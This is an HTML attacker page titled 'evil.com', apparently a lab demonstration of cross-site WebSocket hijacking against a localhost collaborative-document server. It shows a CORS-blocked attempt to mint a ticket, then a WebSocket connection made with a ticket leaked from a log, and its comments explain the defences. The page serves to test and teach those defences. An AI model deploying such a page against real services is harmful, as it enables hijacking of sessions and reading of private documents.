<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>evil.com</title>
<style>
  body { font: 14px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace;
         max-width: 780px; margin: 2rem auto; padding: 0 1rem; }
  h2 { color: crimson; margin-bottom: .2rem; }
  .origin { color: #666; margin-top: 0; }
  label { display: inline-block; width: 4.5rem; }
  input { font: inherit; padding: .25rem .4rem; }
  #ticket { width: 30rem; }
  button { font: inherit; padding: .35rem .8rem; cursor: pointer; margin-right: .4rem; }
  pre { background: #fff4f4; border: 1px solid #f2caca; padding: .8rem;
        border-radius: 4px; white-space: pre-wrap; word-break: break-all;
        min-height: 8rem; }
  .row { margin: .5rem 0; }
  .step { color: #999; }
</style>
</head>
<body>

<h2>evil.com</h2>
<p class="origin">origin: <b id="origin"></b> &mdash; this one is NOT in ALLOWED_ORIGINS</p>

<div class="row">
  <button onclick="steal()">1. try to mint a ticket myself</button>
  <span class="step">expect: blocked by CORS</span>
</div>

<div class="row">
  <label>ticket</label><input id="ticket" placeholder="paste a ticket leaked from an nginx access log">
  <span class="step">2. paste from the app page</span>
</div>

<div class="row">
  <label>doc</label><input id="doc" value="doc-a" size="12">
  <button onclick="attack()">3. attack</button>
  <button onclick="clearLog()">clear</button>
</div>

<pre id="log"></pre>

<script>
const API = "http://localhost:8000";
const WS  = "ws://localhost:8000";

document.getElementById("origin").textContent = location.origin;

const logEl = document.getElementById("log");
const log = (m) => {
  const t = new Date().toISOString().slice(11, 23);
  logEl.textContent += `${t}  ${m}\n`;
  logEl.scrollTop = logEl.scrollHeight;
};
const clearLog = () => { logEl.textContent = ""; };

// Step 1: can evil.com just mint its own ticket?
// No. /ws-ticket is an ordinary HTTP route, so CORS applies and the browser
// refuses to hand this page the response. This is why the ticket pattern
// already defeats CSWSH before the Origin check does anything: a ticket is
// not an ambient credential, so the browser will not fetch one for us.
async function steal() {
  log("POST /ws-ticket from evil.com ...");
  try {
    const r = await fetch(API + "/ws-ticket", {
      method: "POST",
      headers: { "X-User-Id": "alice" },
    });
    const data = await r.json();
    log("  -> MINTED!? " + JSON.stringify(data));
    log("  (if you see this, CORS is not configured -- that is a finding)");
  } catch (e) {
    log("  -> BLOCKED: " + e);
    log("  CORS stopped it. To attack, I need a ticket leaked some other way");
    log("  -- an access log, a proxy log, an APM trace. Paste one below.");
  }
}

// Step 3: the actual CSWSH attempt.
// Note what is NOT here: any way to set the Origin header. new WebSocket()
// takes a url and a subprotocol list, nothing else. The browser writes
// Origin: http://localhost:6666 and there is no API to stop it.
function attack() {
  const ticket = document.getElementById("ticket").value.trim();
  const doc    = document.getElementById("doc").value.trim();
  if (!ticket) { log("paste a ticket first"); return; }

  const url = `${WS}/ws/doc/${doc}?ticket=${encodeURIComponent(ticket)}`;
  log(`WS connect ${doc} from evil.com ...`);

  const ws = new WebSocket(url);
  ws.onopen = () => {
    log("  -> OPEN. evil.com is inside the document.");
    ws.send("i am evil.com and i am reading your document");
  };
  ws.onmessage = (e) => log("  <- " + e.data);
  ws.onerror   = ()  => log("  -> error");
  ws.onclose   = (e) => {
    log(`  -> CLOSED code=${e.code} reason=${e.reason || "(empty)"} clean=${e.wasClean}`);
    if (e.code === 1006) {
      log("  1006, not 1008: the server closed before completing the");
      log("  handshake, so there was no socket to carry a close frame.");
      log("  uvicorn answered HTTP 403 instead. Check the Network tab.");
    }
  };
}
</script>

</body>
</html>
